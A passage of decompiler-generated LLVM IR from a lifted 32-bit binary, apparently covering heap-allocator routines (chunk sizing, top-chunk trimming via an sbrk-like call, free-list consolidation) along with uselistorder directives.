  %tmp134 = icmp ugt i32 %v0_804e0ed, %v1_804e0f2
  br i1 %tmp134, label %dec_label_pc_804e0fa, label %dec_label_pc_804e0ff

dec_label_pc_804e0fa:                             ; preds = %dec_label_pc_804e0ed
  store i32 %v0_804e0ed, i32* @global_var_8058d4c.159, align 4
  br label %dec_label_pc_804e0ff

dec_label_pc_804e0ff:                             ; preds = %dec_label_pc_804e0ed, %dec_label_pc_804e0fa
  %v1_804e0ff = load i32, i32* @global_var_8058d44.152, align 4
  %v2_804e0ff = add i32 %v1_804e0ff, %v0_804e0ed
  store i32 %v2_804e0ff, i32* %eax.global-to-local, align 4
  %v1_804e105 = load i32, i32* @global_var_8058d54.155, align 4
  %tmp135 = icmp ugt i32 %v2_804e0ff, %v1_804e105
  br i1 %tmp135, label %dec_label_pc_804e10d, label %dec_label_pc_804e112

dec_label_pc_804e10d:                             ; preds = %dec_label_pc_804e0ff
  store i32 %v2_804e0ff, i32* @global_var_8058d54.155, align 4
  br label %dec_label_pc_804e112

dec_label_pc_804e112:                             ; preds = %dec_label_pc_804e0ff, %dec_label_pc_804e10d
  %v0_804e112 = load i32, i32* @global_var_8058a0c.142, align 4
  store i32 %v0_804e112, i32* @ebx, align 4
  %v1_804e118 = add i32 %v0_804e112, 4
  %v2_804e118 = inttoptr i32 %v1_804e118 to i32*
  %v3_804e118 = load i32, i32* %v2_804e118, align 4
  %v1_804e11b = and i32 %v3_804e118, -4
  store i32 %v1_804e11b, i32* @ecx, align 4
  %v10_804e11e = icmp ult i32 %v1_804e11b, %v1_804ddbb
  br i1 %v10_804e11e, label %dec_label_pc_804e19e, label %dec_label_pc_804e124

dec_label_pc_804e124:                             ; preds = %dec_label_pc_804e112
  store i32 %v1_804de46, i32* %esi.global-to-local, align 4
  %v2_804e12a = sub i32 %v1_804e11b, %v1_804de46
  store i32 %v2_804e12a, i32* %ecx.global-to-local, align 4
  %v2_804e12c = add i32 %v0_804e112, %v1_804de46
  store i32 %v2_804e12c, i32* @edx, align 4
  %v1_804e12f = or i32 %v1_804de46, 1
  store i32 %v1_804e12f, i32* %eax.global-to-local, align 4
  store i32 %v2_804e12c, i32* @global_var_8058a0c.142, align 4
  store i32 %v1_804e12f, i32* %v2_804e118, align 4
  %v0_804e13b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e13b

dec_label_pc_804e13b:                             ; preds = %dec_label_pc_804ddcc, %dec_label_pc_804e124
  %v0_804e13b = phi i32 [ %v5_804dddf, %dec_label_pc_804ddcc ], [ %v0_804e13b.pre, %dec_label_pc_804e124 ]
  %v1_804e13b = or i32 %v0_804e13b, 1
  store i32 %v1_804e13b, i32* @ecx, align 4
  %v0_804e13e = load i32, i32* @ebx, align 4
  %v1_804e13e = add i32 %v0_804e13e, 8
  store i32 %v1_804e13e, i32* %ebx.global-to-local, align 4
  %v1_804e141 = load i32, i32* @edx, align 4
  %v2_804e141 = add i32 %v1_804e141, 4
  %v3_804e141 = inttoptr i32 %v2_804e141 to i32*
  store i32 %v1_804e13b, i32* %v3_804e141, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804e146:                             ; preds = %dec_label_pc_804db86
  %v5_804e14c = sub i32 %v1_804db69, %v1_804de46
  store i32 %v5_804e14c, i32* %eax.global-to-local, align 4
  %v2_804e150 = add i32 %v0_804dc34111, %v1_804de46
  store i32 %v2_804e150, i32* @edx, align 4
  %v1_804e154 = or i32 %v1_804de46, 1
  store i32 %v2_804e150, i32* @global_var_8058a10.143, align 16
  store i32 %v1_804e154, i32* %v2_804db63, align 4
  %v0_804e160 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e162 = load i32, i32* @edx, align 4
  store i32 %v0_804e162, i32* @global_var_8058a1c.160, align 4
  %v1_804e168 = or i32 %v0_804e160, 1
  store i32 %v1_804e168, i32* @ecx, align 4
  store i32 %v0_804e162, i32* @global_var_8058a20.145, align 32
  %v1_804e171 = add i32 %v0_804e162, 8
  %v2_804e171 = inttoptr i32 %v1_804e171 to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804e171, align 4
  %v0_804e178 = load i32, i32* @edx, align 4
  %v1_804e178 = add i32 %v0_804e178, 12
  %v2_804e178 = inttoptr i32 %v1_804e178 to i32*
  store i32 ptrtoint (i32* @global_var_8058a14.144 to i32), i32* %v2_804e178, align 4
  %v0_804e17f = load i32, i32* @ecx, align 4
  %v1_804e17f = load i32, i32* @edx, align 4
  %v2_804e17f = add i32 %v1_804e17f, 4
  %v3_804e17f = inttoptr i32 %v2_804e17f to i32*
  store i32 %v0_804e17f, i32* %v3_804e17f, align 4
  %v0_804e182 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e182 = load i32, i32* @edx, align 4
  %v3_804e182 = add i32 %v1_804e182, %v0_804e182
  %v4_804e182 = inttoptr i32 %v3_804e182 to i32*
  store i32 %v0_804e182, i32* %v4_804e182, align 4
  br label %dec_label_pc_804e190

dec_label_pc_804e187:                             ; preds = %dec_label_pc_804db95
  store i32 %v1_804de46, i32* %ebx.global-to-local, align 4
  %v0_804e18b = load i32, i32* @ebp, align 4
  %v2_804e18b = or i32 %v1_804de46, 4
  %v3_804e18b = add i32 %v0_804e18b, %v2_804e18b
  %v4_804e18b = inttoptr i32 %v3_804e18b to i32*
  %v5_804e18b = load i32, i32* %v4_804e18b, align 4
  %v6_804e18b = or i32 %v5_804e18b, 1
  store i32 %v6_804e18b, i32* %v4_804e18b, align 4
  br label %dec_label_pc_804e190

dec_label_pc_804e190:                             ; preds = %dec_label_pc_804e146, %dec_label_pc_804e187
  %v0_804e190 = load i32, i32* @ebp, align 4
  %v1_804e190 = add i32 %v0_804e190, 8
  store i32 %v1_804e190, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804e195:                             ; preds = %dec_label_pc_804dc85
  %v1_804e195 = load i32, i32* @ebx, align 4
  %v2_804e195 = add i32 %v0_804dc94, 4
  %v3_804e195 = add i32 %v2_804e195, %v1_804e195
  %v4_804e195 = inttoptr i32 %v3_804e195 to i32*
  %v5_804e195 = load i32, i32* %v4_804e195, align 4
  %v6_804e195 = or i32 %v5_804e195, 1
  store i32 %v6_804e195, i32* %v4_804e195, align 4
  br label %dec_label_pc_804e19a

dec_label_pc_804e19a:                             ; preds = %dec_label_pc_804dc9d, %dec_label_pc_804e195
  %v0_804e19a = load i32, i32* @ecx, align 4
  store i32 %v0_804e19a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804e19e:                             ; preds = %dec_label_pc_804df5c, %dec_label_pc_804e112, %dec_label_pc_804df66
  %v0_804e19e = load i32, i32* %stack_var_-92, align 4
  %v1_804e19e = call i32 @function_804b774(i32 %v0_804e19e)
  store i32 %v1_804e19e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804e1a5 = inttoptr i32 %v1_804e19e to i32*
  store i32 12, i32* %v1_804e1a5, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804e1ab:                             ; preds = %dec_label_pc_804e19a, %dec_label_pc_804e190, %dec_label_pc_804e13b, %dec_label_pc_804ddf7, %dec_label_pc_804dda9, %dec_label_pc_804db30, %dec_label_pc_804e19e
  store i32 %v2_804da67, i32* @eax, align 4
  store i32 %v2_804da67, i32* %stack_var_-92, align 4
  %v2_804e1b4 = call i32 @function_804f2ae(i32 %v2_804da67, i32 1)
  store i32 %v2_804e1b4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e1bc

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804da85, %dec_label_pc_804e1ab
  %v0_804e1bf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e1bf, i32* %eax.global-to-local, align 4
  %v2_804e1c1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e1c1, i32* @ebx, align 4
  store i32 %v0_804da54, i32* @esi, align 4
  store i32 %v0_804da53, i32* @edi, align 4
  store i32 %v0_804da52, i32* @ebp, align 4
  ret i32 %v0_804e1bf

; uselistorder directives
  uselistorder i32 %v0_804e182, { 1, 0 }
  uselistorder i32 %v0_804e162, { 1, 0, 2 }
  uselistorder i32 %v2_804e0ff, { 1, 0, 2 }
  uselistorder i32 %v0_804e0ed, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e084, { 1, 0 }
  uselistorder i32 %v2_804e072, { 1, 0 }
  uselistorder i32 %v1_804e029, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804e013, { 1, 0, 2 }
  uselistorder i32 %v2_804e007, { 1, 2, 0 }
  uselistorder i32 %v2_804e002, { 1, 0, 2 }
  uselistorder i32 %v1_804dff2, { 2, 1, 0 }
  uselistorder i8 %v0_804dfc0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804dfa3, { 1, 0, 2 }
  uselistorder i32 %v0_804e05791, { 2, 0, 1 }
  uselistorder i32 %v0_804e06592, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804df9d, { 2, 1, 0 }
  uselistorder i32 %v8_804df73, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804df70, { 1, 0 }
  uselistorder i32 %v0_804df4f, { 1, 0 }
  uselistorder i32 %v2_804df20, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804df18, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804df05, { 1, 0 }
  uselistorder i32 %v1_804defc, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_804dee9, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804decd, { 1, 0, 2 }
  uselistorder i32 %v2_804deb9, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804de82, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804de76, { 2, 1, 0 }
  uselistorder i32 %v8_804de65, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804de4c, { 1, 0, 2 }
  uselistorder i32 %v0_804dde8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804ddbb, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ddb1, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804dda3, { 1, 0 }
  uselistorder i32 %v1_804dd3a, { 1, 0 }
  uselistorder i32 %v3_804dd2e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804dd3e, { 1, 0 }
  uselistorder i32 %v2_804dd28, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804dd2512, { 1, 0 }
  uselistorder i32 %v2_804dd1a, { 1, 0 }
  uselistorder i32 %v1_804dcfe, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804dcfa, { 2, 1, 0 }
  uselistorder i32 %v1_804dcf6, { 1, 0 }
  uselistorder i32 %v1_804dcea, { 2, 1, 0 }
  uselistorder i32 %v2_804dce0, { 1, 0 }
  uselistorder i32 %v1_804dcdd, { 1, 2, 0 }
  uselistorder i32 %v4_804dc7b, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804dcc6, { 1, 0 }
  uselistorder i32 %v0_804dc94, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804dc67, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804dc34, { 1, 2, 0 }
  uselistorder i32 %v2_804dc18, { 1, 0 }
  uselistorder i32 %v1_804dc0e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804dc09.lcssa, { 1, 0 }
  uselistorder i32 %v3_804dbf9, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804dbf0, { 1, 0, 2 }
  uselistorder i32 %v2_804dbcc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804dbb4, { 2, 1, 0 }
  uselistorder i32 %v0_804dba0, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804db66, { 1, 0, 2 }
  uselistorder i32 %v0_804dc34111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804db13, { 1, 0, 2 }
  uselistorder i32 %v2_804db05, { 2, 1, 0 }
  uselistorder i32 %v2_804dae0, { 2, 1, 0 }
  uselistorder i8 %v0_804daae, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804de46, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804da97, { 0, 2, 1 }
  uselistorder i32 %v0_804da80, { 1, 0 }
  uselistorder i32 %v2_804da67, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 24, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8058d40.157, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_804f5dc, { 1, 0 }
  uselistorder i32 134580756, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8058a20.145, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804da2c, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804e1bc, { 1, 0 }
  uselistorder label %dec_label_pc_804e1ab, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804e19e, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e19a, { 1, 0 }
  uselistorder label %dec_label_pc_804e190, { 1, 0 }
  uselistorder label %dec_label_pc_804e13b, { 1, 0 }
  uselistorder label %dec_label_pc_804e112, { 1, 0 }
  uselistorder label %dec_label_pc_804e0ff, { 1, 0 }
  uselistorder label %dec_label_pc_804e0ed, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e07f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e07a, { 1, 0 }
  uselistorder label %dec_label_pc_804e05e, { 1, 0 }
  uselistorder label %dec_label_pc_804e007, { 1, 0 }
  uselistorder label %dec_label_pc_804dff0, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804df5c, { 1, 0 }
  uselistorder label %dec_label_pc_804df4f, { 1, 0 }
  uselistorder label %dec_label_pc_804df10, { 1, 0 }
  uselistorder label %dec_label_pc_804dee9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804decd, { 1, 0 }
  uselistorder label %dec_label_pc_804deb4, { 1, 0 }
  uselistorder label %dec_label_pc_804de96, { 1, 0 }
  uselistorder label %dec_label_pc_804ddb1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804dda9, { 1, 0 }
  uselistorder label %dec_label_pc_804dd92, { 1, 0 }
  uselistorder label %dec_label_pc_804dd25, { 1, 0 }
  uselistorder label %dec_label_pc_804dd2a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dcfe, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dc85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804dc0c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804dbf5, { 1, 0 }
  uselistorder label %dec_label_pc_804db63, { 1, 0 }
  uselistorder label %dec_label_pc_804dc34.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804db30, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804daae, { 1, 0 }
}

define i32 @function_804e4f0() local_unnamed_addr {
dec_label_pc_804e4f0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804e4f7 = load i32, i32* @edx, align 4
  store i32 %v0_804e4f7, i32* %ebp.global-to-local, align 4
  %v1_804e4f9 = add i32 %v0_804e4f7, 860
  %v2_804e4f9 = inttoptr i32 %v1_804e4f9 to i32*
  %v3_804e4f9 = load i32, i32* %v2_804e4f9, align 4
  store i32 %v3_804e4f9, i32* @ecx, align 4
  %v1_804e4ff = add i32 %v0_804e4f7, 44
  %v2_804e4ff = inttoptr i32 %v1_804e4ff to i32*
  %v3_804e4ff = load i32, i32* %v2_804e4ff, align 4
  %v1_804e502 = add i32 %v3_804e4ff, 4
  %v2_804e502 = inttoptr i32 %v1_804e502 to i32*
  %v3_804e502 = load i32, i32* %v2_804e502, align 4
  %v1_804e505 = and i32 %v3_804e502, -4
  store i32 %v1_804e505, i32* @esi, align 4
  %v1_804e50a = load i32, i32* @eax, align 4
  %v2_804e50a = add i32 %v3_804e4f9, -17
  %v2_804e50c = add i32 %v2_804e50a, %v1_804e505
  %v3_804e50c = sub i32 %v2_804e50c, %v1_804e50a
  %div = udiv i32 %v3_804e50c, %v3_804e4f9
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804e50c, %v3_804e4f9
  store i32 %tmp10, i32* @edx, align 4
  %v1_804e514 = add i32 %div, -1
  %v4_804e517 = mul i32 %v1_804e514, %v3_804e4f9
  store i32 %v4_804e517, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804e517, 1
  br i1 %tmp11, label %dec_label_pc_804e573, label %dec_label_pc_804e51e

dec_label_pc_804e51e:                             ; preds = %dec_label_pc_804e4f0
  %v1_804e523 = call i32 @function_804fa00(i32 0)
  store i32 %v1_804e523, i32* %edi.global-to-local, align 4
  %v0_804e52a = load i32, i32* @esi, align 4
  store i32 %v0_804e52a, i32* %eax.global-to-local, align 4
  %v1_804e52c = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e52c = add i32 %v1_804e52c, 44
  %v3_804e52c = inttoptr i32 %v2_804e52c to i32*
  %v4_804e52c = load i32, i32* %v3_804e52c, align 4
  %v5_804e52c = add i32 %v4_804e52c, %v0_804e52a
  store i32 %v5_804e52c, i32* %eax.global-to-local, align 4
  %v12_804e532 = icmp eq i32 %v1_804e523, %v5_804e52c
  %v1_804e534 = icmp eq i1 %v12_804e532, false
  br i1 %v1_804e534, label %dec_label_pc_804e573, label %dec_label_pc_804e536

dec_label_pc_804e536:                             ; preds = %dec_label_pc_804e51e
  %v1_804e539 = sub i32 0, %v4_804e517
  store i32 %v1_804e539, i32* @ebx, align 4
  %v1_804e53c = call i32 @function_804fa00(i32 %v1_804e539)
  store i32 %v1_804e53c, i32* %eax.global-to-local, align 4
  %v1_804e548 = call i32 @function_804fa00(i32 0)
  store i32 %v1_804e548, i32* %eax.global-to-local, align 4
  %v10_804e550 = icmp eq i32 %v1_804e548, -1
  br i1 %v10_804e550, label %dec_label_pc_804e573, label %dec_label_pc_804e555

dec_label_pc_804e555:                             ; preds = %dec_label_pc_804e536
  %v0_804e555 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e557 = sub i32 %v0_804e555, %v1_804e548
  %v12_804e557 = icmp eq i32 %v2_804e557, 0
  store i32 %v2_804e557, i32* @ecx, align 4
  br i1 %v12_804e557, label %dec_label_pc_804e573, label %dec_label_pc_804e55b

dec_label_pc_804e55b:                             ; preds = %dec_label_pc_804e555
  %v0_804e55b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e55b = add i32 %v0_804e55b, 44
  %v2_804e55b = inttoptr i32 %v1_804e55b to i32*
  %v3_804e55b = load i32, i32* %v2_804e55b, align 4
  store i32 %v3_804e55b, i32* %eax.global-to-local, align 4
  %v1_804e55e = add i32 %v0_804e55b, 872
  %v2_804e55e = inttoptr i32 %v1_804e55e to i32*
  %v3_804e55e = load i32, i32* %v2_804e55e, align 4
  %v5_804e55e = sub i32 %v3_804e55e, %v2_804e557
  store i32 %v5_804e55e, i32* %v2_804e55e, align 4
  %v0_804e564 = load i32, i32* @esi, align 4
  %v1_804e564 = load i32, i32* @ecx, align 4
  %v2_804e564 = sub i32 %v0_804e564, %v1_804e564
  %v1_804e566 = or i32 %v2_804e564, 1
  %v1_804e569 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e569 = add i32 %v1_804e569, 4
  %v3_804e569 = inttoptr i32 %v2_804e569 to i32*
  store i32 %v1_804e566, i32* %v3_804e569, align 4
  br label %dec_label_pc_804e575

dec_label_pc_804e573:                             ; preds = %dec_label_pc_804e555, %dec_label_pc_804e536, %dec_label_pc_804e51e, %dec_label_pc_804e4f0
  br label %dec_label_pc_804e575

dec_label_pc_804e575:                             ; preds = %dec_label_pc_804e55b, %dec_label_pc_804e573
  %storemerge = phi i32 [ 1, %dec_label_pc_804e55b ], [ 0, %dec_label_pc_804e573 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e548, { 1, 0, 2 }
  uselistorder i32 %v4_804e517, { 1, 2, 0 }
  uselistorder i32 %v3_804e4f9, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @function_804fa00, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e575, { 1, 0 }
}

define i32 @function_804e57d(i32* %arg1) local_unnamed_addr {
dec_label_pc_804e57d:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804e57e = load i32, i32* @edi, align 4
  %v0_804e57f = load i32, i32* @esi, align 4
  %v0_804e580 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804e588 = load i32, i32* %arg1, align 4
  store i32 %v2_804e588, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e58f = icmp eq i32 %v2_804e588, 0
  br i1 %v1_804e58f, label %dec_label_pc_804e6b8.preheader, label %dec_label_pc_804e597

dec_label_pc_804e6b8.preheader:                   ; preds = %dec_label_pc_804e57d
  %v3_804e6ad = add i32 %tmp11, 44
  br label %dec_label_pc_804e6a9

dec_label_pc_804e597:                             ; preds = %dec_label_pc_804e57d
  %v1_804e59b = and i32 %v2_804e588, -3
  store i32 %v1_804e59b, i32* %arg1, align 4
  %v1_804e5a0 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804e5ab = add i32 %tmp11, 4
  store i32 %v1_804e5ab, i32* %eax.global-to-local, align 4
  %v2_804e5b6 = load i32, i32* %arg1, align 4
  %v2_804e5bc = udiv i32 %v2_804e5b6, 8
  %v2_804e5bf = mul nuw i32 %v2_804e5bc, 4
  %v3_804e5bf = add i32 %tmp11, -4
  %v4_804e5bf = add i32 %v3_804e5bf, %v2_804e5bf
  store i32 %v4_804e5bf, i32* %eax.global-to-local, align 4
  %v2_804e686 = add i32 %tmp11, 44
  %v3_804e686 = inttoptr i32 %v2_804e686 to i32*
  %v1_804e659 = add i32 %tmp11, 60
  %v2_804e659 = inttoptr i32 %v1_804e659 to i32*
  br label %dec_label_pc_804e5c7

dec_label_pc_804e5c7:                             ; preds = %dec_label_pc_804e69f, %dec_label_pc_804e597
  %v0_804e5d5 = phi i32 [ %v1_804e5ab, %dec_label_pc_804e597 ], [ %v4_804e69f, %dec_label_pc_804e69f ]
  store i32 %v0_804e5d5, i32* %eax.global-to-local, align 4
  %v1_804e5cb = inttoptr i32 %v0_804e5d5 to i32*
  %v2_804e5cb = load i32, i32* %v1_804e5cb, align 4
  store i32 %v2_804e5cb, i32* @ecx, align 4
  %v1_804e5cd = icmp eq i32 %v2_804e5cb, 0
  br i1 %v1_804e5cd, label %dec_label_pc_804e695, label %dec_label_pc_804e5d5

dec_label_pc_804e5d5:                             ; preds = %dec_label_pc_804e5c7
  store i32 0, i32* %v1_804e5cb, align 4
  %v0_804e5db.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e5db

dec_label_pc_804e5db:                             ; preds = %dec_label_pc_804e689, %dec_label_pc_804e5d5
  %v0_804e5f8 = phi i32 [ %v3_804e5db, %dec_label_pc_804e689 ], [ %v0_804e5db.pre, %dec_label_pc_804e5d5 ]
  %v1_804e5db = add i32 %v0_804e5f8, 8
  %v2_804e5db = inttoptr i32 %v1_804e5db to i32*
  %v3_804e5db = load i32, i32* %v2_804e5db, align 4
  store i32 %v3_804e5db, i32* %edx.global-to-local, align 4
  %v1_804e5e2 = add i32 %v0_804e5f8, 4
  %v2_804e5e2 = inttoptr i32 %v1_804e5e2 to i32*
  %v3_804e5e2 = load i32, i32* %v2_804e5e2, align 4
  store i32 %v3_804e5e2, i32* %eax.global-to-local, align 4
  %v1_804e5e7 = and i32 %v3_804e5e2, -2
  store i32 %v1_804e5e7, i32* @edi, align 4
  %v2_804e5ea = urem i32 %v3_804e5e2, 2
  %v3_804e5ea = icmp eq i32 %v2_804e5ea, 0
  %v2_804e5ec = add i32 %v1_804e5e7, %v0_804e5f8
  store i32 %v2_804e5ec, i32* @ebx, align 4
  %v1_804e5ef = add i32 %v2_804e5ec, 4
  %v2_804e5ef = inttoptr i32 %v1_804e5ef to i32*
  %v3_804e5ef = load i32, i32* %v2_804e5ef, align 4
  store i32 %v3_804e5ef, i32* %edx.global-to-local, align 4
  %v1_804e5f6 = icmp eq i1 %v3_804e5ea, false
  br i1 %v1_804e5f6, label %dec_label_pc_804e618, label %dec_label_pc_804e5f8

dec_label_pc_804e5f8:                             ; preds = %dec_label_pc_804e5db
  %v1_804e5f8 = inttoptr i32 %v0_804e5f8 to i32*
  %v2_804e5f8 = load i32, i32* %v1_804e5f8, align 4
  store i32 %v2_804e5f8, i32* %ebp.global-to-local, align 4
  %v2_804e5fc = sub i32 %v0_804e5f8, %v2_804e5f8
  store i32 %v2_804e5fc, i32* %eax.global-to-local, align 4
  %v1_804e5fe = add i32 %v2_804e5fc, 8
  %v2_804e5fe = inttoptr i32 %v1_804e5fe to i32*
  %v3_804e5fe = load i32, i32* %v2_804e5fe, align 4
  store i32 %v3_804e5fe, i32* @esi, align 4
  %v1_804e601 = add i32 %v2_804e5fc, 12
  %v2_804e601 = inttoptr i32 %v1_804e601 to i32*
  %v3_804e601 = load i32, i32* %v2_804e601, align 4
  store i32 %v3_804e601, i32* %edx.global-to-local, align 4
  %v1_804e604 = add i32 %v3_804e5fe, 12
  %v2_804e604 = inttoptr i32 %v1_804e604 to i32*
  %v3_804e604 = load i32, i32* %v2_804e604, align 4
  store i32 %v3_804e604, i32* @ecx, align 4
  %v12_804e607 = icmp eq i32 %v3_804e604, %v2_804e5fc
  %v1_804e609 = icmp eq i1 %v12_804e607, false
  br i1 %v1_804e609, label %dec_label_pc_804e648, label %dec_label_pc_804e60b

dec_label_pc_804e60b:                             ; preds = %dec_label_pc_804e5f8
  %v1_804e60b = add i32 %v3_804e601, 8
  %v2_804e60b = inttoptr i32 %v1_804e60b to i32*
  %v3_804e60b = load i32, i32* %v2_804e60b, align 4
  %v15_804e60b = icmp eq i32 %v3_804e60b, %v3_804e604
  %v1_804e60e = icmp eq i1 %v15_804e60b, false
  br i1 %v1_804e60e, label %dec_label_pc_804e648, label %dec_label_pc_804e610

dec_label_pc_804e610:                             ; preds = %dec_label_pc_804e60b
  %v2_804e610 = add i32 %v2_804e5f8, %v1_804e5e7
  store i32 %v2_804e610, i32* @edi, align 4
  store i32 %v3_804e601, i32* %v2_804e604, align 4
  %v0_804e615 = load i32, i32* @esi, align 4
  %v1_804e615 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e615 = add i32 %v1_804e615, 8
  %v3_804e615 = inttoptr i32 %v2_804e615 to i32*
  store i32 %v0_804e615, i32* %v3_804e615, align 4
  %v0_804e623.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e618

dec_label_pc_804e618:                             ; preds = %dec_label_pc_804e5db, %dec_label_pc_804e610
  %v1_804e62c = phi i32 [ %v2_804e5ec, %dec_label_pc_804e5db ], [ %v0_804e623.pre, %dec_label_pc_804e610 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e620 = and i32 %v3_804e5ef, -4
  store i32 %v1_804e620, i32* %ebp.global-to-local, align 4
  %v4_804e623 = load i32, i32* %v3_804e686, align 4
  %v15_804e623 = icmp eq i32 %v1_804e62c, %v4_804e623
  br i1 %v15_804e623, label %dec_label_pc_804e679, label %dec_label_pc_804e628

dec_label_pc_804e628:                             ; preds = %dec_label_pc_804e618
  %v2_804e628 = add i32 %v1_804e62c, 4
  %v3_804e628 = add i32 %v2_804e628, %v1_804e620
  %v4_804e628 = inttoptr i32 %v3_804e628 to i32*
  %v5_804e628 = load i32, i32* %v4_804e628, align 4
